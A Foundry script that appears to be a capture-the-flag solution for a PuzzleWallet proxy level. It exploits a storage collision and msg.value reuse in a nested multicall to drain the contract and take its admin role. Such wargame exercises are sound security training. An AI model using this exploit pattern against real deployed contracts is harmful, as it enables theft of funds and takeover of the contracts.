pragma solidity ^0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {PuzzleWallet} from "../src/Level24.sol";

contract Level24Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress, wallet.addr);
        vm.stopBroadcast();

        require(levelDone(contractAddress, wallet.addr), "Solution failed");
    }

    function exploit(address _target, address _attacker) private {
        PuzzleWallet target = PuzzleWallet(_target);
        target.proposeNewAdmin(_attacker);
        target.addToWhitelist(_attacker);

        bytes[] memory depositdata = new bytes[](1);
        depositdata[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data = new bytes[](3);
        data[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("multicall(bytes[])", depositdata);
        data[2] = abi.encodeWithSignature("execute(address,uint256,bytes)", _attacker, _target.balance * 2, "");

        target.multicall{value: _target.balance}(data);
        target.setMaxBalance(uint256(uint160(_attacker)));
    }

    function levelDone(address _target, address _attacker) private returns (bool) {
        return PuzzleWallet(_target).admin() == _attacker;
    }
}
